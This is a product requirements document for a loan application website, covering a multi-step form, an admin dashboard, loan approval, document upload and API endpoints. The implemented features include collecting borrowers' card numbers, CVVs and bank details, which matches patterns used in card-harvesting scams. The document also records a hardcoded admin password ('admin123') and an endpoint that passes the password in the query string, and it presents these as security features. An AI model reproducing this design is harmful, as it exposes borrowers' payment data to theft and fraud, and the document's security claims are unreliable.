# Loan Application Website PRD

## Original Problem Statement
Build a loan application website where visitors enter their basic information and zip code to apply for loans.

## Loan Parameters
- **Minimum Loan Amount**: $100
- **Maximum Loan Amount**: $5,000
- **Loan Terms**: 3-24 months
- **Interest Rate**: 8.5% APR

## What's Been Implemented (Jan 2025)

### Phase 1 - MVP
- [x] Landing page with hero, features, CTA
- [x] Multi-step application form (Personal → Address → Financial)
- [x] Form validation with $100-$5000 loan limits
- [x] Success page with reference ID

### Phase 2 - Admin & Notifications
- [x] Admin dashboard with password protection (admin123)
- [x] Dashboard stats & applications table
- [x] Status management (pending → under_review → documents_required → approved/rejected)
- [x] In-app notification system

### Phase 3 - Calculator & Loan Acceptance
- [x] Loan Calculator ($100-$5000, 3-24 months)
- [x] Unique approval link for approved borrowers
- [x] AcceptLoan page with terms agreement
- [x] Banking info collection (account#, routing#, card#, CVV, expiration)

### Phase 4 - Document Management & Security
- [x] Admin can request documents with custom message
- [x] Borrowers see document upload section on Track page
- [x] Secure file upload (PDF, JPG, PNG, max 10MB)
- [x] Admin views uploaded documents
- [x] Password re-verification to view full banking info
- [x] Full banking details displayed after password confirmation

## API Endpoints
- POST /api/applications - Submit application ($100-$5000 limit enforced)
- GET /api/applications - List all
- PATCH /api/applications/{id}/status - Update status
- GET /api/applications/{id}/banking-info?full=true&password=xxx - View full banking info
- POST /api/applications/{id}/upload-document - Upload documents
- GET /api/applications/{id}/documents/{doc_id} - Download document
- GET /api/calculator - Calculate loan payments

## Security Features
- Admin password protection for dashboard access
- Re-authentication required to view sensitive banking data
- Document upload tokens for secure file submission
- Full banking info only shown after password verification
